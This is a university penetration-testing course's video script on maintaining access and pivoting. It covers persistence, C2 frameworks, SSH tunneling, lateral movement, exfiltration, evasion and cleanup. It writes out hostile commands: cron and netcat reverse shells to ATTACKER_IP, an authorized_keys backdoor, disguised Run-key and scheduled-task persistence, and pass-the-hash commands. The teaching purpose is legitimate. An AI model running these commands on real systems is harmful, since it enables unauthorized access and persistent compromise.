# Video Script: Module 13 — Maintaining Access & Pivoting

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Estimated Duration: 20–24 minutes

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

## Segment 1 — Introduction (0:00–1:30)

Welcome back to CIS-4333 Penetration Testing. I am Professor Nash, and this is Module 13: Maintaining Access and Pivoting.

In the previous module we covered how to escalate from a low-privilege foothold to root or SYSTEM. In this module we explore what happens next. A real-world attacker does not simply prove they can escalate and leave — they establish persistence to survive reboots, pivot through the network to reach additional systems, and eventually exfiltrate or leverage whatever they came for.

As penetration testers, we simulate these behaviors to demonstrate the full depth of potential impact. If the engagement stops at initial access, the client may not understand how far an attacker could actually reach. Persistence and pivoting turn a single compromised host into a demonstration of network-wide risk.

This module covers persistence mechanisms on both Linux and Windows, the difference between backdoors and command-and-control frameworks, SSH tunneling and port forwarding, pivoting techniques using Metasploit and proxychains, lateral movement methods, data exfiltration concepts, detection evasion, and — critically — cleanup and artifact removal.

This module aligns with CompTIA PenTest+ Domain 3: Attacks and Exploits.

---

## Segment 2 — Persistence Mechanisms (1:30–5:30)

Persistence is any mechanism that allows an attacker to maintain access across a reboot or loss of the initial shell. The Rules of Engagement must explicitly authorize persistence before implementing it — persistence mechanisms have operational consequences for the client.

### Linux Persistence

Cron jobs are the most common Linux persistence mechanism. Adding a reverse shell to the current user's crontab:

```bash
crontab -e
```

Add a line such as:

```
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

This runs every minute. More subtle — add it to a system crontab file that runs less frequently and is less likely to be noticed.

SSH authorized keys persistence is more reliable than a cron shell. Add the attacker's public key to the target user's `authorized_keys` file:

```bash
echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

Now the attacker can SSH in as that user without a password, even after a reboot.

Backdoor binaries replace legitimate system utilities with modified versions that include a backdoor trigger. This is noisy and easily detected by file integrity monitoring.

### Windows Persistence

Registry Run Keys are the most common Windows persistence technique. Adding a value to the Run key causes it to execute when any user logs on:

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\user\payload.exe"
```

HKCU requires only user privileges. HKLM requires administrator privileges but runs for all users.

Scheduled Tasks provide more control over timing and trigger conditions. The `schtasks` command creates a task:

```cmd
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\user\payload.exe" /sc onlogon /ru SYSTEM
```

The name "WindowsUpdate" blends in with legitimate system tasks.

Startup Folder persistence drops an executable or shortcut into the user's startup folder:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Service-based persistence registers a new Windows service. This requires administrator privileges but survives reboots independently of user login.

---

## Segment 3 — Backdoors and C2 Frameworks (5:30–8:00)

### Remote Access Tools vs. Command-and-Control

A simple backdoor provides a reverse shell — when executed, it connects back to the attacker's listener and provides a command prompt. Netcat is the simplest example:

```bash
nc -e /bin/bash ATTACKER_IP 4444  # on target
nc -lvnp 4444                      # on attacker
```

This works for demonstration but is fragile, easily detected, and not suitable for long-term access simulation.

Command-and-control frameworks provide encrypted, resilient, feature-rich channels for managing compromised hosts. The PenTest+ exam references several:

Metasploit's Meterpreter is a staging payload that provides an in-memory shell with modules for privilege escalation, credential dumping, pivoting, and file operations. It uses encrypted communications and does not write to disk (fileless operation).

Cobalt Strike is the industry-standard commercial C2 framework used by advanced red teams. Its Beacon payload communicates via configurable protocols (HTTP, HTTPS, DNS, SMB) and supports malleable C2 profiles to mimic legitimate traffic patterns.

Empire is an open-source PowerShell-based C2 framework that operates entirely in memory using PowerShell agents — a living-off-the-land approach that avoids dropping executables to disk.

The PenTest+ exam tests awareness of these frameworks. You do not need to operate Cobalt Strike for the exam, but you should know what each framework provides and when it is appropriate.

---

## Segment 4 — SSH Tunneling and Port Forwarding (8:00–12:00)

SSH tunneling is one of the most powerful and commonly used pivoting techniques because SSH is nearly universally present in Linux environments and its encrypted traffic is generally permitted through firewalls.

### Local Port Forwarding

Local port forwarding binds a port on the attacker machine and forwards connections to a destination through the SSH server. The attacker machine is the local end:

```bash
ssh -L 8080:internal.server.com:80 user@jump.server.com
```

Any connection to `localhost:8080` on the attacker machine is forwarded through `jump.server.com` to `internal.server.com:80`. This reaches internal web services that are not directly accessible from the internet.

### Remote Port Forwarding

Remote port forwarding is the reverse — it binds a port on the SSH server and forwards connections back to the attacker machine. Useful when the attacker wants to expose a local service through the jump host:

```bash
ssh -R 4444:localhost:4444 user@jump.server.com
```

### Dynamic Port Forwarding (SOCKS Proxy)

Dynamic port forwarding creates a SOCKS proxy on the attacker machine that forwards all traffic through the SSH connection to the remote network. This is the most flexible form of SSH pivoting:

```bash
ssh -D 9050 user@jump.server.com
```

Now configure `proxychains` to use SOCKS5 at `127.0.0.1:9050`:

```
# /etc/proxychains4.conf
socks5 127.0.0.1 9050
```

Any command prefixed with `proxychains` routes through the SSH tunnel:

```bash
proxychains nmap -sT -p 80,443,8080 192.168.10.0/24
```

This scans the internal network segment through the compromised jump host without any traffic appearing to originate from the attacker's IP.

---

## Segment 5 — Lateral Movement (12:00–15:30)

Lateral movement uses access on one compromised system to gain access to additional systems in the network.

### PsExec

PsExec is a Sysinternals tool that executes commands on remote Windows systems over SMB. It requires administrator credentials or NTLM hashes (via pass-the-hash with Impacket):

```bash
python3 psexec.py domain/administrator@192.168.1.50
```

PsExec drops a service binary on the target, executes it, and provides an interactive command prompt. It is loud — it generates Windows event logs for service installation.

### WMI (Windows Management Instrumentation)

WMI provides command execution over the network with less footprint than PsExec:

```bash
python3 wmiexec.py domain/administrator@192.168.1.50 "whoami"
```

WMI execution is harder to detect because it does not create a visible service. It does generate WMI activity events, but these are less commonly monitored.

### SMB (Pass-the-Hash with smbexec)

`smbexec.py` provides command execution via SMB without the service installation step of PsExec — even quieter:

```bash
python3 smbexec.py -hashes :NTLM_HASH administrator@192.168.1.50
```

### RDP (Remote Desktop Protocol)

With valid credentials or a pass-the-hash attack (using restricted admin mode), RDP provides a full graphical desktop on the target. For lateral movement:

```bash
xfreerdp /u:administrator /pth:NTLM_HASH /v:192.168.1.50
```

RDP generates prominent authentication log events but provides the most complete access to the target system.

### SSH for Linux Lateral Movement

With stolen SSH keys or reused credentials, SSH provides direct shell access to Linux systems. Combined with SSH agent forwarding, a single compromised key can chain through multiple systems.

---

## Segment 6 — Metasploit Pivoting (15:30–18:00)

Metasploit has built-in pivoting support that integrates with its framework for coordinated multi-host operations.

### Adding a Route

Once a Meterpreter session is established on a pivot host, add a route to the internal subnet through that session:

```
msf> route add 192.168.10.0/24 <session_id>
```

Metasploit now routes traffic destined for the `192.168.10.0/24` network through the Meterpreter session on the pivot host. You can scan and exploit hosts on the internal network directly from Metasploit without needing separate SSH tunneling.

### SOCKS Proxy via Metasploit

The `auxiliary/server/socks_proxy` module creates a SOCKS proxy through active Meterpreter sessions:

```
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 9050
msf> set VERSION 5
msf> run
```

Combined with proxychains, this routes arbitrary tools through the Meterpreter pivot session.

---

## Segment 7 — Data Exfiltration and Detection Evasion (18:00–20:30)

### Exfiltration Methods

Data exfiltration is the process of transferring data from the target network to attacker-controlled infrastructure. For penetration tests, actual data exfiltration is rarely performed — instead, the tester documents what data could have been exfiltrated and demonstrates the capability.

DNS exfiltration encodes data in DNS query strings. DNS traffic is frequently permitted outbound and rarely inspected. Tools like `dnscat2` tunnel complete shells through DNS.

HTTP/HTTPS exfiltration sends data over common web protocols. Large data transfers may blend into normal web traffic. Certificate pinning and TLS inspection can detect anomalous destinations.

ICMP tunneling embeds data in the payload of ping packets. Less reliable but may bypass some network filters.

### Detection Evasion Concepts

Security products detect post-exploitation activity through signatures, behavioral analytics, and network monitoring. Key evasion concepts:

Signature evasion avoids using known malicious payloads that antivirus detects by name. Custom payloads, obfuscation, and encoding reduce signature matching.

Behavioral evasion avoids suspicious process chains (e.g., Word spawning cmd.exe) that endpoint detection and response (EDR) platforms flag as indicators of compromise.

Traffic blending mimics normal application traffic patterns using malleable C2 profiles. Cobalt Strike's malleable profiles configure Beacon to communicate exactly like legitimate software.

Memory-only operation avoids writing payloads to disk, evading file-based antivirus scans. Meterpreter and PowerShell Empire both operate in-memory.

---

## Segment 8 — Cleanup and Artifact Removal (20:30–22:30)

Cleanup is a critical but often overlooked phase of penetration testing. Failure to clean up leaves backdoors, modified files, and attacker tools on the client's systems.

### What to Clean Up

Remove all backdoors and persistence mechanisms you installed. This includes cron entries, registry Run keys, scheduled tasks, SSH authorized keys you added, and any service entries.

Delete all tools and payloads dropped on target systems. This includes enumeration scripts like LinPEAS and WinPEAS, Mimikatz, reverse shell executables, and any payload files.

Clear logs where authorized in the Rules of Engagement. Log clearing is controversial — some clients want to see that attackers cleared logs as a finding, while others request that you restore the log state. Always follow the RoE.

Restore modified configurations. If you changed a service binary path, modified a file permission, or altered a registry key as part of the test, restore it to its original state.

### Documentation During Cleanup

Maintain a detailed record of every modification made during the test. For each action:
- What was changed
- What the original state was
- When the change was made
- When it was reverted

This log protects the tester legally and helps the client verify their environment is clean after the test. If cleanup is not complete, the final report should list all remaining artifacts with instructions for the client to remove them.

---

## Segment 9 — Module Summary (22:30–24:00)

Let us wrap up. In this module you learned:

- Persistence mechanisms: cron jobs and SSH keys on Linux; registry Run keys, scheduled tasks, and startup folders on Windows
- The difference between simple backdoors and C2 frameworks: Metasploit Meterpreter, Cobalt Strike, and Empire
- SSH tunneling: local, remote, and dynamic (SOCKS proxy) port forwarding
- Proxychains configuration to route tool traffic through SOCKS proxies
- Lateral movement: PsExec, WMI, SMB, and RDP with valid credentials or pass-the-hash
- Metasploit routes and SOCKS proxy for coordinated multi-host operations
- Data exfiltration channels: DNS, HTTP/HTTPS, ICMP tunneling
- Detection evasion: signature evasion, behavioral evasion, memory-only operation
- Cleanup responsibilities: removing backdoors, tools, and modified configurations

Persistence and pivoting are what transform a single compromised host into a network-wide breach demonstration. Cleanup responsibilities are what transform a professional penetration test into something legally and ethically defensible.

Your lab this week uses TryHackMe to practice SSH tunneling and Metasploit pivoting. Your quiz tests your knowledge of persistence mechanisms, tunneling concepts, and lateral movement tools. Your discussion explores the ethical and legal dimensions of persistence and cleanup.

Thank you for your work in this module. These four modules — web application testing, wireless assessment, post-exploitation, and maintaining access — form the core of the CompTIA PenTest+ Domain 3 content. You are well prepared for the exam and for professional penetration testing engagements.

---

*End of Module 13 Video Script*
